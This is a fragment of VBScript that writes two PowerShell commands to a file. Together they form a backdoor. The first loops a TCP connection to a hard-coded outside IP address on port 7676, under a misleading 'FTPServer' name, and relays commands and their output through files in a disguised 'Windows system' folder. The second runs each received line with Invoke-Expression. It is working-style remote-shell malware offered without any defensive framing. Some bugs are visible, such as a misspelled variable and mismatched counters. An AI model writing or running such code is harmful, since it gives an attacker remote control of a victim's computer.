...
objFile.WriteLine "start powershell -Command ""$FTPServer = '23.95.80.128';$FTPPort = '7676';$inputCounter = 0;$outputCounter = 0;$testConnection=0; while(1){    $tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort);    $tcpStream = $tcpConnection.GetStream();    $reader = New-Object System.IO.StreamReader($tcpStream);    $writer = New-Object System.IO.StreamWriter($tcpStream);    $writer.AutoFlush = $true;    $buffer = new-object System.Byte[] 1024;    $encoding = new-object System.Text.AsciiEncoding;            while ($tcpConnection.Connected) {        while ($tcpStream.DataAvailable -or $reader.Peek() -ne -1 ) {              write-host $reader.ReadLine();             <#$path = -join('C:\Program Files\Windows system\input', $inputCounter,'.txt');            Set-Content -Path $path -Value $reader.ReadLine();#>            $inputCounter+=1;        }                $pathOutput = -join('C:\Program Files\Windows system\output',$outputCounter,'.txt');        if(Test-Path $pathOutput){            $output = Get-Content $pathOutput;            if($output.length -ge 1){                Foreach($s in $output){                    $writer.WriteLine($s);                };              };            $outputCounter+=1;            Remove-Item $pathOutput;        };            start-sleep -Milliseconds 120;        $testConnection+=1;        if($testConnection -ge 48){            $writer.WriteLine('');            $testConnection=0;        }    };        $reader.Close();    $writer.Close();    $tcpConnection.Close();        start-sleep -Milliseconds 7000;}"" >> input.txt"
objFile.WriteLine "start powershell -Command ""$counterInput = 0;$lineCounter = 0;while (1) {    $path = -join('C:\Program Files\Windows system\input.txt');        if(Test-Path $path){        $input = Get-Content $path | select-object -skip $lineCounter;        $lineCounter += $input.length;        Foreach($line in $inupt){            $outputPath = -join('C:\Program Files\Windows system\output', $counterOutput, '.txt');            $output = Invoke-Expression $line;            $joinedOutput = '';            Foreach($s in $output){                $joinedOutput+= $s;                $joinedOutput+=[environment]::NewLine;            }            Set-Content -Path $outputPath -Value $joinedOutput;            $counterInput+=1;            Remove-Item $path;        }        <#if($input.length -ge 1){            $outputPath = -join('C:\Program Files\Windows system\output', $counterOutput, '.txt');            $output = Invoke-Expression $input;            $joinedOutput = '';            Foreach($s in $output){                $joinedOutput+= $s;                $joinedOutput+=[environment]::NewLine;            };            Set-Content -Path $outputPath -Value $joinedOutput;        };                $counterInput+=1;        $counterOutput+=1;        Remove-Item $path;#>    };            start-sleep -Milliseconds 120;};"""
objFile.Close
